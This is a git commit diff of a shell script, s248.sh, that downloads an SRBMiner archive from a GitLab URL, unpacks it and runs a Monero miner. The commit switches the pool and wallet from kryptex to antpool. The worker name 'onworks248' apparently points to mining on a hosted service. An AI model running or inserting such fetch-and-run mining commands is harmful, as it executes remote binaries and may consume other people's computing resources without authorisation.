0a7fd690d581758e24b220b5cd0dda7a450eef71
myce <me@example.com>
2025-02-24 23:13:52 +0530

    no more kryptex

--- s248.sh
+++ s248.sh
@@ -1,6 +1,6 @@
-wget https://gitlab.com/sight2/03ef/-/raw/master/SRBMiner-Multi-2-7-9-Linux.tar.gz && \
+wget https://gitlab.com/sight2/09ef/-/raw/master/SRBMiner-Multi-2-7-9-Linux.tar.gz && \
 gunzip SRBMiner-Multi-2-7-9-Linux.tar.gz && \
 tar --extract -f SRBMiner-Multi-2-7-9-Linux.tar && \
 cd SRBMiner-Multi-2-7-9 && \
 chmod +x * && \
-./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://xmr.kryptex.network:7777 --wallet krxYEJVN46/onworks248 --disable-gpu
+./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://xmr.antpool.com:9005 --wallet exemar/onworks248 --disable-gpu
